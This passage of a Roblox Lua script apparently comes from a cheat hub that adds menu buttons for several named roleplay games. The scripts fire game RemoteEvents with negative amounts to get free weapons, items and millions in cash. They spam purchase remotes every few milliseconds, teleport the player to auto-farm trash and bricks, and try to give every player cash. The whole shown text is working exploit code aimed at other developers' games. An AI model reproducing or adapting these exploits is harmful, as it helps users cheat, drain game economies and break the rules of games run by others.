Glow.SliceCenter = Rect.new(100, 100, 100, 100)
Glow.Parent = MainFrame

IDLabel.Visible = false
IDBox.Visible = false
end)

addMainMenuButton("URBAN CITY V3 AUTO OXY [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local oxyRemote = ReplicatedStorage:WaitForChild("OxyComplete")

--// ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AutoOxyGUI"
screenGui.Parent = player:WaitForChild("PlayerGui")

--// Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 120)
frame.Position = UDim2.new(0.5, -125, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- ultra black
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui
frame.AnchorPoint = Vector2.new(0.5, 0.5)

--// Rounded corners
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 15)
uiCorner.Parent = frame

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "AUTO OXY"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.Parent = frame

--// Button
local oxyButton = Instance.new("TextButton")
oxyButton.Size = UDim2.new(0, 200, 0, 50)
oxyButton.Position = UDim2.new(0.5, -100, 0, 60)
oxyButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- full black
oxyButton.Text = "OXY"
oxyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
oxyButton.Font = Enum.Font.GothamBold
oxyButton.TextSize = 20
oxyButton.Parent = frame

--// Button rounded corners
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = oxyButton

--// Button click function
oxyButton.MouseButton1Click:Connect(function()
    oxyRemote:FireServer("APOY", -1)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BUHAY BARANGAY RP [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 250)  -- Adjusted height to fit content better
frame.Position = UDim2.new(0.5, -150, 0.5, -125)  -- Repositioned to center
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "BUHAY BARANGAY RP"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy (Silenced Pistol, Water, Oxy)
local items = {
    {"Silenced Pistol", "Silenced Pistol"},
    {"Water", "Water"},
    {"Oxy", "Oxy"}
}

local selectedItem = nil

-- Create Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #items * 30)  -- Adjust the height based on item count
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Create buttons inside the dropdown
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 30)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]  -- Store the selected item's internal name
        dropdown.Text = item[1]  -- Update dropdown text to selected item
        dropdownFrame.Visible = false  -- Hide the dropdown after selection
    end)
end

-- Toggle Dropdown Visibility
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Toggle Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 85 + (#items * 30) + 5)  -- Adjusted position for Auto Buy button
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

local isAutoBuying = false

toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            if selectedItem == "Silenced Pistol" then
                game:GetService("ReplicatedStorage").GiveToolRemote:FireServer("Silenced Pistol", -0)
                print("Auto-buying Silenced Pistol")
            elseif selectedItem == "Desert Eagle" then
                game:GetService("ReplicatedStorage").GiveToolRemote:FireServer("Water", -0)
                print("Auto-buying Desert Eagle")
            elseif selectedItem == "AmmoBox" then
                game:GetService("ReplicatedStorage").GiveToolRemote:FireServer("Oxy", -0)
                print("Auto-buying AmmoBox")
            end
        end
        task.wait(10)  -- Wait 1 second between purchases to prevent spam
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)


addMainMenuButton("KALYEONSE SYSTEM [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 250)  -- Adjusted height to fit content better
frame.Position = UDim2.new(0.5, -150, 0.5, -125)  -- Repositioned to center
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "KALYE ONSE"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy (Silenced Pistol, Desert Eagle, AmmoBox)
local items = {
    {"Silenced Pistol", "Silenced Pistol"},
    {"Desert Eagle", "Desert Eagle"},
    {"AmmoBox", "AmmoBox"}
}

local selectedItem = nil

-- Create Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #items * 30)  -- Adjust the height based on item count
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Create buttons inside the dropdown
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 30)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]  -- Store the selected item's internal name
        dropdown.Text = item[1]  -- Update dropdown text to selected item
        dropdownFrame.Visible = false  -- Hide the dropdown after selection
    end)
end

-- Toggle Dropdown Visibility
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Toggle Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 85 + (#items * 30) + 5)  -- Adjusted position for Auto Buy button
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

local isAutoBuying = false

toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            if selectedItem == "Silenced Pistol" then
                game:GetService("ReplicatedStorage").MicSystem:FireServer("Silenced Pistol", -0)
                print("Auto-buying Silenced Pistol")
            elseif selectedItem == "Desert Eagle" then
                game:GetService("ReplicatedStorage").MicSystem:FireServer("Desert Eagle", -0)
                print("Auto-buying Desert Eagle")
            elseif selectedItem == "AmmoBox" then
                game:GetService("ReplicatedStorage").MicSystem:FireServer("AmmoBox", -0)
                print("Auto-buying AmmoBox")
            end
        end
        task.wait(0.001)  -- Wait 1 second between purchases to prevent spam
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("DOMINION BYPASS CS [3KTG]", function()
	local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local autoFarm = false
local teleportDelay = 3 -- seconds between each TP

-- Function para mag-trigger ng ProximityPrompt
local function triggerPrompt(prompt)
    if prompt and prompt:IsA("ProximityPrompt") then
        prompt.HoldDuration = 0
        if typeof(fireproximityprompt) == "function" then
            fireproximityprompt(prompt)
        else
            prompt:InputHoldBegin()
            task.wait()
            prompt:InputHoldEnd()
        end
    end
end

-- Function para mag-teleport sa position
local function tpTo(pos)
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = pos
    end
end

-- Main auto farm loop
local function farmTrash()
    while autoFarm do
        local trashList = {}
        for _, v in ipairs(workspace:GetDescendants()) do
            if v:IsA("ProximityPrompt") and v.ObjectText == "Trash" then
                table.insert(trashList, v)
            end
        end
        
        for _, prompt in ipairs(trashList) do
            if not autoFarm then break end
            tpTo(prompt.Parent.CFrame + Vector3.new(0, 3, 0)) -- TP above trash
            task.wait(0.1)
            triggerPrompt(prompt)
            task.wait(teleportDelay) -- wait before next TP
        end
    end
end

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer.PlayerGui
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 200, 0, 50)
Frame.Position = UDim2.new(0.1, 0, 0.1, 0)
Frame.BackgroundColor3 = Color3.new(0, 0, 0)
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Text = "TAONG GOMA BYPASS"
Title.Size = UDim2.new(1, 0, 0.4, 0)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextScaled = true
Title.Parent = Frame

local Button = Instance.new("TextButton")
Button.Text = "AUTO FARM: OFF"
Button.Size = UDim2.new(1, 0, 0.6, 0)
Button.Position = UDim2.new(0, 0, 0.4, 0)
Button.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
Button.TextColor3 = Color3.new(1, 1, 1)
Button.TextScaled = true
Button.Parent = Frame

Button.MouseButton1Click:Connect(function()
    autoFarm = not autoFarm
    Button.Text = "AUTO FARM: " .. (autoFarm and "ON" or "OFF")
    if autoFarm then
        task.spawn(farmTrash)
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("DOMINION REFRESH [3KTG]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-2059.056640625, 82.64264678955078, -1830.01953125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("AUTO FARM DOMINION [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Vim = game:GetService("VirtualInputManager")

--// Variables
local autoFarm = false

--// Function para mag-hold ng E
local function holdE(seconds)
    Vim:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(seconds)
    Vim:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end

--// Function para kunin ang pinakamalapit na brick
local function getNearestBrick()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return nil end

    local root = char.HumanoidRootPart
    local nearest, shortestDist = nil, math.huge

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name == "Brick" and obj:IsA("BasePart") then
            local dist = (obj.Position - root.Position).Magnitude
            if dist < shortestDist then
                shortestDist = dist
                nearest = obj
            end
        end
    end

    return nearest
end

--// Auto Farm Loop
task.spawn(function()
    while task.wait(0.1) do
        if autoFarm then
            local brick = getNearestBrick()
            if brick then
                -- Teleport sa ibabaw ng brick
                LocalPlayer.Character:PivotTo(brick.CFrame + Vector3.new(0, 3, 0))
                task.wait(0.1)
                holdE(2) -- hold E
                task.wait(2) -- cooldown bago ulit
            end
        end
    end
end)

--// GUI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 250, 0, 100)
Frame.Position = UDim2.new(0.5, -125, 0.5, -50)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Text = "TAONG GOMA AUTO FARM"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18
Title.Parent = Frame

local Button = Instance.new("TextButton")
Button.Size = UDim2.new(1, -20, 0, 40)
Button.Position = UDim2.new(0, 10, 0, 40)
Button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Button.BorderSizePixel = 0
Button.Text = "Auto Farm: OFF"
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.Font = Enum.Font.SourceSansBold
Button.TextSize = 18
Button.Parent = Frame

--// Button Toggle
Button.MouseButton1Click:Connect(function()
    autoFarm = not autoFarm
    Button.Text = "Auto Farm: " .. (autoFarm and "ON" or "OFF")
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PINOY DARK RP [3KTG]", function()
	-- Auto Farm Garbage: instant TP + auto E + Auto Sell All (by button)
-- TAONG GOMA BYPASS CS

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LP = Players.LocalPlayer

local GarbageEvent = ReplicatedStorage:FindFirstChild("GarbageRewardEvent")
local AUTO_FARM = false
local HOVER_HEIGHT = 3
local LOOT_COOLDOWN = 0.05

--================ GUI ==================
local ScreenGui = Instance.new("ScreenGui", LP:WaitForChild("PlayerGui"))
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.BackgroundColor3 = Color3.fromRGB(0,0,0) -- pure black
Frame.Size = UDim2.new(0, 200, 0, 90)
Frame.Position = UDim2.new(0.4, 0, 0.1, 0)
Frame.Active = true
Frame.Draggable = true

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0.3, 0)
Title.BackgroundColor3 = Color3.fromRGB(0,0,0)
Title.Text = "TAONG GOMA AUTO FARM "
Title.TextColor3 = Color3.new(1,1,1)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 16

local AutoFarmBtn = Instance.new("TextButton", Frame)
AutoFarmBtn.Size = UDim2.new(1, 0, 0.35, 0)
AutoFarmBtn.Position = UDim2.new(0, 0, 0.3, 0)
AutoFarmBtn.Text = "Auto Farm: OFF"
AutoFarmBtn.BackgroundColor3 = Color3.fromRGB(0,0,0)
AutoFarmBtn.TextColor3 = Color3.new(1,1,1)
AutoFarmBtn.Font = Enum.Font.SourceSansBold
AutoFarmBtn.TextSize = 18

local AutoSellBtn = Instance.new("TextButton", Frame)
AutoSellBtn.Size = UDim2.new(1, 0, 0.35, 0)
AutoSellBtn.Position = UDim2.new(0, 0, 0.65, 0)
AutoSellBtn.Text = "Auto Sell Now"
AutoSellBtn.BackgroundColor3 = Color3.fromRGB(0,0,0)
AutoSellBtn.TextColor3 = Color3.new(1,1,1)
AutoSellBtn.Font = Enum.Font.SourceSansBold
AutoSellBtn.TextSize = 18

AutoFarmBtn.MouseButton1Click:Connect(function()
    AUTO_FARM = not AUTO_FARM
    AutoFarmBtn.Text = "Auto Farm: " .. (AUTO_FARM and "ON" or "OFF")
end)
--======================================

local function getHRP()
    local char = LP.Character or LP.CharacterAdded:Wait()
    return char:WaitForChild("HumanoidRootPart")
end

local function tpInstant(pos)
    local hrp = getHRP()
    hrp.CFrame = CFrame.new(pos + Vector3.new(0, HOVER_HEIGHT, 0))
    task.wait(0.05)
end

local function triggerPrompt(prompt)
    if fireproximityprompt then
        fireproximityprompt(prompt)
    else
        local old = prompt.HoldDuration
        prompt.HoldDuration = 0
        prompt:InputHoldBegin(); task.wait()
        prompt:InputHoldEnd()
        prompt.HoldDuration = old
    end
end

local function findAllGarbage()
    local list = {}
    for _, d in ipairs(workspace:GetDescendants()) do
        if d:IsA("ProximityPrompt") then
            local ot = (d.ObjectText or ""):lower()
            local at = (d.ActionText or ""):lower()
            local pn = d.Parent and d.Parent.Name:lower() or ""
            if ot:find("garbage") or at:find("garbage") or pn:find("garbage") then
                table.insert(list, d)
            end
        end
    end
    local hrp = getHRP()
    table.sort(list, function(a,b)
        local pa = (a.Parent:IsA("BasePart") and a.Parent or a.Parent:FindFirstChildWhichIsA("BasePart", true))
        local pb = (b.Parent:IsA("BasePart") and b.Parent or b.Parent:FindFirstChildWhichIsA("BasePart", true))
        pa = pa and pa.Position or hrp.Position
        pb = pb and pb.Position or hrp.Position
        return (hrp.Position - pa).Magnitude < (hrp.Position - pb).Magnitude
    end)
    return list
end

local function findSellPrompt()
    for _, d in ipairs(workspace:GetDescendants()) do
        if d:IsA("ProximityPrompt") then
            local ot = (d.ObjectText or ""):lower()
            local at = (d.ActionText or ""):lower()
            local nm = (d.Name or ""):lower()
            if (ot..at..nm):find("sell") and (ot..at..nm):find("garbage") then
                return d
            end
        end
    end
end

local function getGarbageTools()
    local t = {}
    local function scan(container)
        for _, v in ipairs(container:GetChildren()) do
            if v:IsA("Tool") and v.Name:lower():find("garbage") then
                table.insert(t, v)
            end
        end
    end
    scan(LP.Backpack)
    if LP.Character then scan(LP.Character) end
    return t
end

local function countGarbageTools()
    return #getGarbageTools()
end

local function collect(prompt)
    local part = prompt.Parent:IsA("BasePart") and prompt.Parent or prompt.Parent:FindFirstChildWhichIsA("BasePart", true)
    if not part then return end
    tpInstant(part.Position)
    triggerPrompt(prompt)
    if GarbageEvent then pcall(function() GarbageEvent:FireServer() end) end
    task.wait(LOOT_COOLDOWN)
end

local function sellAllNow()
    local sellPrompt = findSellPrompt()
    if not sellPrompt then return end
    local part = sellPrompt.Parent:IsA("BasePart") and sellPrompt.Parent or sellPrompt.Parent:FindFirstChildWhichIsA("BasePart", true)
    if not part then return end

    tpInstant(part.Position)
    task.wait(0.2)

    local safety = 0
    while countGarbageTools() > 0 and safety < 200 do
        safety += 1
        local any = getGarbageTools()[1]
        if any then
            if any.Parent ~= LP.Character then
                any.Parent = LP.Character
                task.wait(0.08)
            end
            triggerPrompt(sellPrompt)
            task.wait(0.12)
        else
            break
        end
    end
end

AutoSellBtn.MouseButton1Click:Connect(sellAllNow)

task.spawn(function()
    while task.wait(0.05) do
        if AUTO_FARM then
            local targets = findAllGarbage()
            if #targets > 0 then
                for _, p in ipairs(targets) do
                    if not AUTO_FARM then break end
                    collect(p)
                end
            else
                if countGarbageTools() > 0 then
                    sellAllNow()
                end
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GIVE ALL CASH 10M [3KTG]", function()
	local Players = game:GetService("Players")

local function giveMoneyToAll(amount)
	for _, player in ipairs(Players:GetPlayers()) do
		local stats = player:FindFirstChild("leaderstats")
		if stats then
			local cash = stats:FindFirstChild("Cash")
			if cash then
				cash.Value += amount
			end
		end
	end
end

-- Example: Bigyan lahat ng +10,000,000
giveMoneyToAll(10000000)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("GUNSHOP LIST [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "TAONG GOMA ALL CITY CMD"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Glock-17", "Desert Deagle", "AmmoBox", "Skorpion", "HK416", "UZI"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (TAONG GOMA CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.new(1, 1, 1)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.GunShop.Events.Purchase:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("CAVITE ROLEPLAY [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
